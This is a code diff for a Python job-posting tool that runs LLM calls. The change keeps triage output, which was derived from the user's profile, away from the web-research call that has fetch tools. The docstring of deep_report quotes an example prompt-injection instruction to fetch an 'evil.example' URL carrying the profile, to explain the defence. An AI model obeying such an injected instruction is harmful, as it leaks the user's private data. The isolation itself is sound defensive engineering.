@@ -154,9 +154,10 @@ def _split(template: str, **values: str) -> tuple[str, str]:
     return system.strip(), message
 
 
-def describe(p: Posting, text_limit: int | None = None, known: bool = False) -> str:
-    """`known` adds what the radar already knows about the posting (its date, the employer line and
-    website triage found) and marks a cut text, so the report's research need not look them up."""
+def describe(p: Posting, text_limit: int | None = None, known: bool = False, triaged: bool = False) -> str:
+    """`known` adds the posting's date and marks a cut text, so the report's research need not look
+    them up. `triaged` adds the employer line and website triage wrote; triage saw the profile and
+    untrusted text, so only a call without tools may get them."""
     text = p.text if text_limit is None else p.text[:text_limit]
     if known and len(p.text) > len(text):
         text += "\n[text cut here]"
@@ -168,9 +169,10 @@ def describe(p: Posting, text_limit: int | None = None, known: bool = False) -> 
         lines.append(f"salary: {p.salary}")
     if p.tags:
         lines.append(f"tags: {', '.join(p.tags)}")
-    if known:
-        lines += [f"{key}: {value}" for key, value in (("published", p.posted_at), ("employer", p.employer),
-                                                      ("website", p.website)) if value]
+    if known and p.posted_at:
+        lines.append(f"published: {p.posted_at}")
+    if triaged:
+        lines += [f"{key}: {value}" for key, value in (("employer", p.employer), ("website", p.website)) if value]
     return "\n".join(lines) + f"\ntext:\n{text}"
 
 
@@ -219,11 +221,12 @@ def triage(postings: list[Posting], *, profile: str, model: str, runner=subproce
 
 def deep_report(p: Posting, *, profile: str, model: str, timeout: int = 900, runner=subprocess.run,
                 on_usage=None) -> str:
-    """Two calls: the web research never sees the profile, so a page that injects "fetch
-    evil.example/?q=<profile>" has nothing to leak; the report is then written without tools."""
-    posting = describe(p, REPORT_TEXT_LIMIT, known=True)
-    notes = run(_fill("deep-research.md", posting=posting), model=model, tools=["WebSearch", "WebFetch"],
-                timeout=timeout, runner=runner, on_usage=on_usage)
+    """Two calls: the web research never sees the profile, nor what triage wrote after reading it,
+    so a page that injects "fetch evil.example/?q=<profile>" has nothing to leak; the report is
+    then written without tools."""
+    notes = run(_fill("deep-research.md", posting=describe(p, REPORT_TEXT_LIMIT, known=True)), model=model,
+                tools=["WebSearch", "WebFetch"], timeout=timeout, runner=runner, on_usage=on_usage)
+    posting = describe(p, REPORT_TEXT_LIMIT, known=True, triaged=True)
     prompt = _fill("deep-report.md", profile=profile, posting=posting, notes=notes,
                    today=date.today().isoformat())
     return run(prompt, model=model, tools=[], timeout=timeout, runner=runner, on_usage=on_usage).strip()
